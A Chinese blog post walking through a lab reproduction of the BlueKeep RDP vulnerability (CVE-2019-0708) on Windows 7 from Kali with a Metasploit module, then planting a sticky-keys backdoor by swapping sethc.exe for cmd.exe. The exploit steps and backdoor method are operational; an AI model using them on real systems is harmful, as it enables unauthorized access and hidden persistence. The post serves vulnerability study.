# CVE-2019-0708 远程桌面代码漏洞复现 - Hndreamer - 博客园

> 原文：[`www.cnblogs.com/Hndreamer/p/16382845.html`](https://www.cnblogs.com/Hndreamer/p/16382845.html)

**环境配置**

Win2007sp1 ip:192.168.171.136

Kali2021.02 ip:192.168.171.129

Win2007sp1 开启 3389 端口关闭防火墙

靶机和攻击机能够相互 ping 通

**3** **漏洞复现**

Kali 终端打开 msf,并搜索 cve-2019-0708 或者 bulekeep

然后

use 1 或者 use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

Show target

选择 target 3

选择攻击的 IP 地址 set rhost ip，这里是 192.168.171.136

Win2007 出现蓝屏，过后系统记录 dump 诊断文件并自动重启

若想拿到 shell，在 show target 里再选择一次 target 4 即可，run 后

拿到目标主机后 whoami 查看该系统，并在 c 系统盘创建 text 文件夹

返回 win7 查看确实创建了 text 文件夹

下面是进一步利用 sechc.exe 与 cmd.exe 互换功能，使其按五次 shift 后弹出 cmd 过程

直接改名会提示没有权限，如下图进入属性，高级，更改所有者，后回到安全，添加想给的用户权限即可。

完成后删除 sethc.后面 cmd 添加权限同理即可。最后将 cmd 命名为 sethc 即偷梁换柱成功。

Kali 里面重新远程连接后,按五次 shift 即可弹出 cmd.